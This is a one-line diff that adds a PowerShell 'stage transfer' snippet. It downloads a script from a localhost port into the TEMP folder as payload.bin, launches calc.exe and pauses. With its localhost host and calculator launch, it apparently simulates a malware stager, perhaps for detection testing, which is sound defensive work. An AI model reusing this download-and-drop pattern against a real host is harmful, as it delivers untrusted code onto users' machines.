@@ -1,0 +1,1 @@
+<# Stage transfer #> $RemoteUrl = 'http://localhost:9001/stage1.ps1'; $DropPath = "$env:TEMP\payload.bin"; (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $DropPath); & "calc.exe"; Start-Sleep -Seconds 13
